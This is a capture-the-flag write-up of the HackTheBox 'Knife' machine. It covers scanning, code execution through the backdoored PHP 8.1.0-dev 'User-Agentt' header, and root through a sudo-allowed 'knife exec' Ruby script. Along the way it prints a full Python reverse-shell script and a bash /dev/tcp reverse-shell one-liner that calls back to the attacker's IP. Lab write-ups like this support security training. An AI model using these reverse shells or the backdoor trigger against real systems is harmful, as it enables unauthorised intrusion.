---
title: Knife - HackTheBox
published: true
---

![](assets/img/knife-htb/logo.png)

**Hey guys.** In this blogpost we are going to pwn **Knife** from [HackTheBox](https://www.hackthebox.eu).

Knife is an easy rated linux box. We exploit a backdoored version of php to get user, and then execute a ruby script via knife to get root on the box.

With that said, let us begin.

# [](#header-1)SCANNING :

```
┌──(root💀nehal)-[~]
└─# nmap -sC -sV 10.129.111.24
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-24 03:41 IST
Nmap scan report for 10.129.111.24
Host is up (3.8s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.10 seconds
```

We have 2 services here : **OpenSSH 8.2p1** SSH service on port 22 and **Apache httpd 2.4.41** web service on port 80.

Now if you want, you can do a full port scan. Since I found nothing in it, I am skipping it.

Let us move on to enumeration.

# [](#header-2)ENUMERATION : 

As we can not do much with SSH, let us start with the web first.

By going to the IP via the browser, we get the below page :

![](assets/img/knife-htb/webite-HomePage.png)

It looks just like a static page with no links in it. I tried to do some directory brute-forcing. No luck there.

But when we observe the response headers from the server, we do get an interesting thing.

![](assets/img/knife-htb/php-HeaderInfo.png)

As we can see from `X-Powered-By : PHP/8.1.0-dev` header, the **PHP** version being used here is **8.1.0-dev**. This version of **PHP** was implanted with a backdoor recently. When this backdoor is present on a server, an attacker can execute arbitrary code by sending a User-Agentt header. You can learn more about it [here](https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor).

In the link above, the guy has used **PHP** function `var_dump()` with the `User-Agentt` header to trigger the backdoor. Let us see if that works for us.

![](assets/img/knife-htb/backdoor-PoC.png)

We do not see any variable dumping. However, we do see `int(54289)` which might be a good thing for us.

Now, let us go malicious and try functions like `system()` to get RCE on the box.

![](assets/img/knife-htb/RCE-PoC.png)

As you can see, when I provided `system()` function with arguments `id && whoami` in the `User-Agentt` header, the command gets run on the server and we get to see the output. So we have RCE here.

Time to get a shell.

# [](#header-1)EXPLOITATION :

After a little enumeration of the box with the RCE, I figured out the box has python3 installed. So we can just use it to get a reverse shell.

### Reverse shell code :
```py
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("<YOUR IP>", <YOUR PORT>))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/bash","-i"]);
```

You can simply make it a one-liner via the `-c` option of python3.

`python3 -c <YOUR CODE IN ONE LINE>`

Set up a listener on your specified port.

![](assets/img/knife-htb/shell.png)

```
┌──(root💀nehal)-[~]
└─# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.111.24] 42698
james@knife:/$ 
```

And we have shell as user `James`. You can read the user flag now.

# [](#header-1)PRIVILEGE ESCALATION : 

James can run a particular command with sudo as root.

```
james@knife:/$ sudo -l
Matching Defaults entries for james on knife:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
james@knife:/$
```

If you look for `--help` option for `knife`, you will find a link to it's manual ([here](https://docs-archive.chef.io/release/12-9/knife_exec.html) it is).

If you look well enough, you will find that you can run any ruby script with the `exec` command of `knife`. So we can use this to escalate our privileges.

`knife exec /path/to/script_file`

```
james@knife:~$ cat script.rb 
#!/usr/bin/env ruby

exec "/bin/bash -c '/bin/bash >& /dev/tcp/10.10.16.29/9001 0>&1'"
james@knife:~$ 
```

Here, I have created a ruby script where I used the `exec` function of ruby to run system commands on the box. In this case, it is a reverse shell connecting back to our machine. If you want, you can directly run the ruby code with the `-E` option of `knife exec`, so you do not have to create a script file.

Set up a listener on the specified port and run this script.

```
james@knife:~$ sudo /usr/bin/knife exec /home/james/script.rb
```

```
┌──(root💀nehal)-[~/Documents/htb/knife]
└─# nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.16.29] from (UNKNOWN) [10.129.111.24] 46308
python3 -c "import pty;pty.spawn('/bin/bash')"
root@knife:/home/james# id && hostname && echo "Pwned by Nehal"
id && hostname && echo "Pwned by Nehal"
uid=0(root) gid=0(root) groups=0(root)
knife
Pwned by Nehal
root@knife:/home/james# 
```

And we are root now. You can read the root flag too.

So that was **Knife** from **HackTheBox**.
**Thanks** for reading this far. Hope you liked it.
I will see you in the next writeup. **PEACE**

